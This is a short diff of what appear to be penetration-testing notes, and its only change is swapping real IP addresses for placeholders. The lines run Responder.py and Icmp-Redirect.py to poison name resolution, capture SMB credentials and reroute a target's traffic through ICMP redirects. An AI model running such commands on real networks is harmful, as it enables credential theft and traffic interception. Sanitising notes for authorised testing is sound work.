@@ -1,9 +1,9 @@
 
-python Responder.py -i 192.168.142.128 -I eth0 -d SMB -b 0 -r 1 -v
+python Responder.py -i X.X.X.128 -I eth0 -d SMB -b 0 -r 1 -v
 
-python Icmp-Redirect.py -I eth0 -i X.X.100.64 -g X.X.100.254 -t X.X.100.129 -r 10.1.X.22
+python Icmp-Redirect.py -I eth0 -i X.X.100.64 -g X.X.100.254 -t X.X.100.129 -r 10.1.X.X
 
-python Responder.py -I eth0 -i 172.20.100.64 -w Off
+python Responder.py -I eth0 -i X.X.100.64 -w Off
 
-python Responder.py -I eth0 -i 172.20.100.64 -F off
+python Responder.py -I eth0 -i X.X.100.64 -F off
 
